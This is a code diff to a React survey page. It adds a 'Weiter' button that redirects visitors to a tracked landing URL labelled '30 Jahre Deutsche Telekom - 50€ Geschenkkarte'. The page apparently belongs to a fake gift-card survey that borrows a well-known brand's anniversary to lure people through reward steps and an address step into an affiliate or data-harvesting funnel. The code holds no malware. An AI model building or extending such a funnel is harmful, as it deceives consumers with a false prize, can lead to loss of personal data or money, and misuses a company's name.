@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Label } from '@/components/ui/label';
@@ -16,6 +17,7 @@ const brandLogos = {
 };
 
 const Survey = () => {
+  const navigate = useNavigate();
   const [isLoading, setIsLoading] = useState(true);
   const [currentStep, setCurrentStep] = useState(1);
   const [answers, setAnswers] = useState<Record<string, string>>({});
@@ -405,6 +407,13 @@ const Survey = () => {
             setRewardStep(3);
           };
 
+          const handleWeiterClick = () => {
+            const subId4 = "30 Jahre Deutsche Telekom - 50€ Geschenkkarte";
+            const subId5 = brandLogos[selectedBrand];
+            const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
+            window.location.href = redirectUrl;
+          };
+
           return (
             <div className="bg-white rounded-lg shadow-lg overflow-hidden">
               {/* Step Indicators */}
@@ -611,7 +620,10 @@ const Survey = () => {
 
                         {/* Continue Button - Show when "Meine Adresse" is selected */}
                         {selectedAddress === 'meine' && (
-                          <Button className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors">
+                          <Button 
+                            onClick={handleWeiterClick}
+                            className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors"
+                          >
                             Weiter
                           </Button>
                         )}
